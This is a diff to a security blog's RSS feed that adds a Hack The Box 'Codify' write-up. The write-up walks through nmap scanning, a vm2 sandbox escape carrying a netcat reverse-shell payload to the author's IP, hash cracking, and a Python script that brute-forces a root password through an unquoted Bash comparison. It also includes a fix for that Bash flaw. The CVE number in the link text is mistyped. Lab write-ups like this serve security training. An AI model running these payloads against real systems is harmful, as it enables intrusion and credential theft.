@@ -6,8 +6,218 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 23 Mar 2024 01:25:21 -0500</lastBuildDate>
+        <lastBuildDate>Fri, 05 Apr 2024 16:50:10 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Codify</title>
+            <link>https://scorpiosec.com/posts/2024/04/htb-codify/</link>
+            <pubDate>Fri, 05 Apr 2024 16:50:10 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/04/htb-codify/</guid>
+            <description>Platform: Hack The Box Link: Codify Level: Easy OS: Linux Codify starts with a web application that offers a sandbox environment for testing Node.js code. It utilizes the vm2 library and employs a module whitelist for security. However, there is a vulnerability (CVE-2023-3214 ) in vm2 that can be exploited to break out of the sandbox and access the target system. This is followed by lateral movement to access another user account and obtain the user flag.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Codify" target="_blank" >Codify</a>
+
+</li>
+<li>Level: Easy</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Codify starts with a web application that offers a sandbox environment for testing Node.js code. It utilizes the <a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16" target="_blank" >vm2</a>
+
+ library and employs a module whitelist for security. However, there is a vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32314" target="_blank" >CVE-2023-3214</a>
+
+ ) in vm2 that can be exploited to break out of the sandbox and access the target system. This is followed by lateral movement to access another user account and obtain the user flag. Additionally, upon identifying a vulnerability in a script that we can run with elevated privileges, a custom brute force script is employed to obtain the root password.</p>
+<p>Target IP address - <code>10.10.11.239</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Codify 10.10.11.239
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-21 20:19 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.239
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://codify.htb/
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js Express framework
+</span></span><span style="display:flex;"><span>|_http-title: Codify
+</span></span><span style="display:flex;"><span>Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.83 seconds
+</span></span></code></pre></div><p>We find three ports open 22 (SSH), 80 (HTTP) and 3000 (Node.js). We are being redirected to <code>codify.htb</code> which I added to the <code>/etc/hosts</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.239 codify.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>The website is a service to test Node.js code in a sandbox environment.</p>
+<p><img src="/images/HTB-Codify/codify-website.png" alt="Codify Website"></p>
+<p>Clicking <code>Try it now</code> brings up an editor where code can be run.</p>
+<p><img src="/images/HTB-Codify/code-run.png" alt="Codify Sanbox Environment"></p>
+<p>The platform uses a module whitelist for security purposes.</p>
+<p><img src="/images/HTB-Codify/codify-limitations.png" alt="Codify Module Whitelist"></p>
+<p>In the <code>About Us</code> section we learn that the <a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16" target="_blank" >vm2</a>
+
+ library is used.</p>
+<p><img src="/images/HTB-Codify/codify-about.png" alt="Codify About Section"></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>Researching for vm2 vulnerabilities, we find <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32314" target="_blank" >CVE-2023-3214</a>
+
+ and a PoC can be found <a href="https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac" target="_blank" >here</a>
+
+. The exploit allows us to escape the sandbox and obtain remote code execution (RCE).</p>
+<p>After multiple failures, the search for a reverse shell leads to <a href="https://www.youtube.com/watch?v=_q_ZCy-hEqg&amp;ab_channel=0xdf" target="_blank" >this</a>
+
+ old video of 0xdf where he explains <code>mkfifo / nc Reverse Shell</code>. Some mkfifo reverse shells are available <a href="https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/b76e6441-5999-45e4-949e-bd332cb21cce.xhtml" target="_blank" >here</a>
+
+ and the first one ends up working. Below is the complete code.</p>
+<blockquote>
+<p>Don&rsquo;t forget to change the IP address and port number accordingly.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">VM</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;vm2&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">vm</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">VM</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  const err = new Error();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  err.name = {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    toString: new Proxy(() =&gt; &#34;&#34;, {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      apply(target, thiz, args) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const process = args.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        throw process.mainModule.require(&#34;child_process&#34;).execSync(&#34;rm -f /tmp/a; mkfifo /tmp/a; nc 10.10.14.13 9001 0&lt;/tmp/a | /bin/sh &gt;/tmp/a 2&gt;&amp;1; rm /tmp/a &#34;).toString();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }),
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  };
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  try {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    err.stack;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  } catch (stdout) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    stdout;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">code</span>));
+</span></span></code></pre></div><p>Initial access is achieved after running the code in the editor.</p>
+<p><img src="/images/HTB-Codify/foothold.png" alt="Codify Foothold"></p>
+<p>The shell can be upgraded by running the commands below.</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
+export TERM=xterm  
+ctrl + z  
+stty raw -echo; fg
+stty rows 38 columns 116
+</code></pre><h3 id="lateral-movement">Lateral Movement</h3>
+<p>Access to the <code>joshua</code> directory in <code>/home</code> is denied. It is owned by the user <code>joshua</code> which is our target for lateral movement.</p>
+<p><img src="/images/HTB-Codify/access-denied.png" alt="Access to Joshua directory denied"></p>
+<p>After running <code>linpeas</code> on the target, some interesting accessible files are found in the Apache web root directory.</p>
+<p><img src="/images/HTB-Codify/Codify-intersting-files.png" alt="Files found by linpeas"></p>
+<p>The file <code>tickets.db</code> in <code>/var/www/contact</code> contains the password hash for the user <code>joshua</code>.</p>
+<p><img src="/images/HTB-Codify/pwd-hash.png" alt="User josua password hash"></p>
+<p><code>hashid</code> reveals that it is a Blowfish hash.</p>
+<p><img src="/images/HTB-Codify/hashid.png" alt="Hashid command results"></p>
+<p>Using john to crack the hash, the password <code>spongebob1</code> is retrieved.</p>
+<p><img src="/images/HTB-Codify/hash-cracked.png" alt="User Joshua password"></p>
+<p>With the credentials <code>joshua:spongebob1</code> we can login via SSH and get the user flag <code>user.txt</code></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Running <code>sudo -l</code> reveals that the user <code>joshua</code> can run the script <code>mysql-backup.sh</code> as root.</p>
+<p><img src="/images/HTB-Codify/sudo-l.png" alt="Sudo -l command results"></p>
+<p>When we try to execute the script we get the prompt <code>Enter MySQL password for root:</code>.</p>
+<p>This is the content of the script</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DB_USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;root&#34;</span>
+</span></span><span style="display:flex;"><span>DB_PASS<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/cat /root/.creds<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>BACKUP_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/backups/mysql&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>read -s -p <span style="color:#e6db74">&#34;Enter MySQL password for </span>$DB_USER<span style="color:#e6db74">: &#34;</span> USER_PASS
+</span></span><span style="display:flex;"><span>/usr/bin/echo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $DB_PASS <span style="color:#f92672">==</span> $USER_PASS <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        /usr/bin/echo <span style="color:#e6db74">&#34;Password confirmed!&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        /usr/bin/echo <span style="color:#e6db74">&#34;Password confirmation failed!&#34;</span>
+</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/mkdir -p <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>databases<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/mysql -u <span style="color:#e6db74">&#34;</span>$DB_USER<span style="color:#e6db74">&#34;</span> -h 0.0.0.0 -P <span style="color:#ae81ff">3306</span> -p<span style="color:#e6db74">&#34;</span>$DB_PASS<span style="color:#e6db74">&#34;</span> -e <span style="color:#e6db74">&#34;SHOW DATABASES;&#34;</span> | /usr/bin/grep -Ev <span style="color:#e6db74">&#34;(Database|information_schema|performance_schema)&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> db in $databases; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Backing up database: </span>$db<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/mysqldump --force -u <span style="color:#e6db74">&#34;</span>$DB_USER<span style="color:#e6db74">&#34;</span> -h 0.0.0.0 -P <span style="color:#ae81ff">3306</span> -p<span style="color:#e6db74">&#34;</span>$DB_PASS<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$db<span style="color:#e6db74">&#34;</span> | /usr/bin/gzip &gt; <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">/</span>$db<span style="color:#e6db74">.sql.gz&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;All databases backed up successfully!&#34;</span>
+</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;Changing the permissions&#34;</span>
+</span></span><span style="display:flex;"><span>/usr/bin/chown root:sys-adm <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>/usr/bin/chmod <span style="color:#ae81ff">774</span> -R <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#39;Done!&#39;</span>
+</span></span></code></pre></div><p>The image below highlights the script vulnerability. In Bash, if the right side of the <code>==</code> operator in a conditional expression (within double square brackets <code>[[ ... ]]</code>) is not quoted, Bash performs pattern matching (also known as globbing) rather than interpreting it as a string.</p>
+<p><img src="/images/HTB-Codify/script-vulnerability.png" alt="mysql-backup.sh script vulnerability"></p>
+<p>For example if the password is <code>hello</code>, both <code>[[$DB_PASS == hello]]</code> and <code>[[$DB_PASS == h*]]</code> will match because <code>h*</code> is a pattern that matches any string starting with the letter <code>h</code>. Knowing this, bruteforcing the password becomes a viable solution.</p>
+<blockquote>
+<p>To fix this, you should quote the variable <code>$USER_PASS</code> in the comparison, like so: <code>if [[ $DB_PASS == &quot;$USER_PASS&quot; ]]; then</code>. This ensures that the value of <code>$USER_PASS</code> is treated as a string, not a pattern.</p>
+</blockquote>
+<p>Below is the Python script I used</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chars <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
+</span></span><span style="display:flex;"><span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>next<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] initializing bruteforce script...&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] bruteforce in progress, please wait...&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> next<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> chars:
+</span></span><span style="display:flex;"><span>                errorlevel<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;echo &#34;</span><span style="color:#f92672">+</span>password<span style="color:#f92672">+</span>i<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;* | sudo /opt/scripts/mysql-backup.sh &gt;/dev/null 2&gt;&amp;1&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> errorlevel<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                        password<span style="color:#f92672">=</span>password<span style="color:#f92672">+</span>i
+</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">&#34;[+] new character found: &#34;</span><span style="color:#f92672">+</span>password)
+</span></span><span style="display:flex;"><span>                        next<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>: next<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] process terminated, root password is: &#34;</span><span style="color:#f92672">+</span>password)
+</span></span></code></pre></div><p>Here’s how it works:</p>
+<ol>
+<li>
+<p>It imports the necessary modules: <code>string</code> for character sets and <code>os</code> for executing system commands.</p>
+</li>
+<li>
+<p>It defines a character set <code>chars</code> that includes all ASCII letters (both lowercase and uppercase) and digits.</p>
+</li>
+<li>
+<p>An empty string password is initialized to store the discovered password characters, and a flag (<code>next</code>) to control the loop.</p>
+</li>
+<li>
+<p>It enters a while loop that continues as long as <code>next</code> is 1. Inside this loop:</p>
+<ul>
+<li>It iterates over each character <code>i</code> in <code>chars</code>.</li>
+<li>For each character, it constructs a command that echoes the current password plus the character <code>i</code>, followed by a wildcard <code>*</code>, and pipes this to <code>sudo /opt/scripts/mysql-backup.sh</code>. The command is executed in a shell and its output is redirected to /dev/null to suppress it.</li>
+<li>If the command succeeds (i.e., the exit status <code>errorlevel</code> is <code>0</code>), it means that the current <code>password</code> plus the character <code>i</code> is a prefix of the actual password. In this case, it appends <code>i</code> to password, prints a message to the console, and sets <code>next</code> to <code>1</code> to continue the loop.</li>
+<li>If the command fails (i.e., the exit status <code>errorlevel</code> is non-zero), it means that the current <code>password</code> plus the character <code>i</code> is not a prefix of the actual password. In this case, it sets <code>next</code> to <code>0</code> to stop the loop after the current iteration.</li>
+</ul>
+</li>
+<li>
+<p>After the loop terminates, it prints a message to the console indicating that the process has terminated and displays the discovered password.</p>
+</li>
+</ol>
+<p>After running the script, the root password is found to be <code>kljh12k3jhaskjh12kjh3</code>.</p>
+<p><img src="/images/HTB-Codify/root-pwd.png" alt="mysql-backup.sh script vulnerability"></p>
+<p>After switching to <code>root</code>, the root flag <code>root.txt</code> is found in <code>/root</code>.</p>
+<p><img src="/images/HTB-Codify/root-flag.png" alt="mysql-backup.sh script vulnerability"></p>
+<p>I enjoyed this challenge especially the code review part because it is one of my weakest skills. Having some scripting/programming knowledge in Bash and Python will always help as a security professional.</p>
+<p>freeCodeCamp has a Bash Scripting Tutorial for Beginners <a href="https://www.youtube.com/watch?v=tK9Oc6AEnR4&amp;t=18s&amp;ab_channel=freeCodeCamp.org" target="_blank" >video</a>
+
+ on their YouTube channel. If you prefer books <a href="https://www.amazon.com/Learning-bash-Shell-Programming-Nutshell/dp/0596009658" target="_blank" >Learning the bash Shell, 3rd Edition</a>
+
+ and <a href="https://www.amazon.com/Linux-Command-Line-2nd-Introduction/dp/1593279523" target="_blank" >The Linux Command Line, 2nd Edition: A Complete Introduction</a>
+
+ are my recommendations.</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: Analytics</title>
